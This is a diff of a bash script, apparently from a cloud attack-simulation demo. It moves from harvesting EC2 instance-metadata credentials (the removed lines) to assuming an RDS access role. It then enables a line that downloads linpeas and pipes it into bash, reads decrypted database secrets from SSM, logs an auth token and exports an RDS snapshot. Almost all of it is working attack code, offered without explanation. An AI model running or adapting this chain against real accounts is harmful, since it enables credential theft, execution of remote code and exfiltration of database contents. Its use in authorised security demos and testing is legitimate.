@@ -1,6 +1,6 @@
 #!/bin/bash
 
-SCRIPTNAME=instance2rds
+SCRIPTNAME=iam2rds
 LOGFILE=/tmp/$SCRIPTNAME.log
 function log {
     echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
@@ -29,40 +29,38 @@ REGION=${region}
 ENVIRONMENT=target
 DEPLOYMENT=${deployment}
 
-INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
-AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+log "Using default profile"
+PROFILE="default"
 
-# create an env file for scoutsuite
-log "Building env file with ec2 instance creds..."
-cat > .aws-ec2-instance <<-EOF
-AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
-AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
-AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
-AWS_DEFAULT_REGION=us-east-1
-AWS_DEFAULT_OUTPUT=json
-EOF
+ROLE_NAME="rds_user_access_role_ciemdemo"
+SESSION_NAME="db-export"
 
-log "Setting up a instance profile with aws cli"
-PROFILE="instance"
+log "Running: aws sts get-caller-identity --profile=$PROFILE"
+aws sts get-caller-identity --profile=$PROFILE >> $LOGFILE 2>&1
+
+log "Getting current account number..."
+AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
+log "Account Number: $AWS_ACCOUNT_NUMBER"
+
+CREDS=$(aws sts assume-role --role-arn "arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME" --profile=$PROFILE --role-session-name "$SESSION_NAME")
+AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.Credentials.AccessKeyId')
+AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.Credentials.SecretAccessKey')
+AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Credentials.SessionToken')
+
+PROFILE="db"
 aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
 aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
 aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
 aws configure set region $REGION --profile=$PROFILE
 aws configure set output json --profile=$PROFILE
 
-log "Running: aws sts get-caller-identity --profile=$PROFILE"
-aws sts get-caller-identity --profile=$PROFILE >> $LOGFILE 2>&1
-
 # log "Running cloud discovery..."
 # docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
 # log "done."
 
-# log "Running local discovery..."
-# curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex >> $LOGFILE 2>&1
-# log "done."
-# opts="--output json"
+log "Running local discovery..."
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex >> $LOGFILE 2>&1
+log "done."
 
 aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
 aws ssm get-parameter --name="db_name" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
@@ -81,10 +79,6 @@ log "Token: $TOKEN"
 # connect to mysql database - optional
 # curl -LOJ https://s3.amazonaws.com/rds-downloads/rds-combined-ca-bundle.pem
 # mysql --host=$DBHOST --port=$DBPORT --ssl-ca=rds-combined-ca-bundle.pem --enable-cleartext-plugin --user=$DBUSER --password=$TOKEN
-
-log "Getting current account number..."
-AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
-log "Account Number: $AWS_ACCOUNT_NUMBER"
 
 log "Getting DbInstanceIdentifier..."
 DB_INSTANCE_ID=$(aws rds describe-db-instances \
@@ -159,6 +153,7 @@ aws rds describe-export-tasks \
 
 while true; do
     STATUS=$(aws rds describe-export-tasks --profile=$PROFILE --region=$REGION --export-task-identifier $EXPORT_TASK_IDENTIFIER --source-arn $DB_SNAPSHOT_ARN --query 'ExportTasks[0].Status' --output text)
+    
     if [ "$STATUS" == "COMPLETE" ]; then
         log "Export task completed successfully."
         break
